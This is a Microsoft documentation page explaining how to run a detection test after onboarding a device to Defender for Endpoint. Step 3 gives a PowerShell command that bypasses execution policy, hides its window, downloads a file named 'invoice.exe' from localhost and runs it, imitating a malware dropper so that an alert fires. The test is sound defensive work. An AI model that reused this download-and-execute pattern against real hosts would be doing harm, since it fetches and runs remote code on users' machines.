---
title: Run a detection test after adding a device to Microsoft Defender for Endpoint device
description: Run the detection script on a device that has recently been added to the Microsoft Defender for Endpoint service to verify that it is properly onboarded
keywords: detection test, detection, powershell, script, verify, onboarding, microsoft defender for endpoint onboarding, clients, servers, test
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection: 
  - m365-security-compliance
  - m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
---

# Run a detection test on a newly onboarded Microsoft Defender for Endpoint device 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**Applies to:**
- Supported Windows 10 versions
- Windows Server 2012 R2
- Windows Server 2016
- Windows Server, version 1803
- Windows Server, 2019
- [Microsoft Defender for Endpoint](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> Want to experience Microsoft Defender for Endpoint? [Sign up for a free trial.](https://signup.microsoft.com/create-account/signup?products=7f379fee-c4f9-4278-b0a1-e4c8c2fcdf7e&ru=https://aka.ms/MDEp2OpenTrial?ocid=docs-wdatp-exposedapis-abovefoldlink)

Onboarding devices is the method of adding devices to the Microsoft Defender for Endpoint service. It allows devices to report signals to the service.  

Verifying that a device has been successfully added to the service is an important step in the entire deployment process. 

## Verify onboarding using a detection test
Run the following PowerShell script on a newly onboarded device to verify that it is properly reporting to the Defender for Endpoint service.

1. Create a folder:  'C:\test-MDATP-test'.
2. Open an elevated command-line prompt on the device and run the script:

   1. Go to **Start** and type **cmd**.

   1. Right-click **Command Prompt** and select **Run as administrator**.

      ![Window Start menu pointing to Run as administrator](images/run-as-admin.png)

3. At the prompt, copy and run the following command:

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

The Command Prompt window will close automatically. If successful, the detection test will be marked as completed and a new alert will appear in the portal for the onboarded device in approximately 10 minutes.

## Related topics
- [Onboard Windows 10 devices](configure-endpoints.md)
- [Onboard servers](configure-server-endpoints.md)
- [Troubleshoot Microsoft Defender for Endpoint onboarding issues](/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
